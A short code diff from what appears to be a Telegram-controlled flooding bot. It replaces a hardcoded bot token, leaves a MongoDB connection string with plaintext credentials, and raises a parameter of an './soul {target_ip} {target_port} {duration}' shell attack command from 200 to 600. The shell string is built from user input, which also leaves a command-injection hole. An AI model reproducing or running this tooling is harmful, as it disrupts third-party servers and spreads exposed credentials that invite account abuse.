@@ -16,7 +16,7 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
 loop = asyncio.get_event_loop()
 
-TOKEN = "7812845918:AAHjhz7mH_1k0cIRROAcIg_ND7-uMWHakPE"
+TOKEN = "7310070119:AAHWkvAy1gkNb11C1G21LtNstCZwd7jZ7oM"
 MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
 FORWARD_CHANNEL_ID = -1002478713234
 CHANNEL_ID = -1002478713234
@@ -88,7 +88,7 @@ import asyncio
 async def run_attack_command_async(target_ip, target_port, duration):
     # Run both commands concurrently
     attack_process = asyncio.create_subprocess_shell(
-        f"./soul {target_ip} {target_port} {duration} 200"
+        f"./soul {target_ip} {target_port} {duration} 600"
     )
     pkill_process = asyncio.create_subprocess_shell("pkill screen")
 
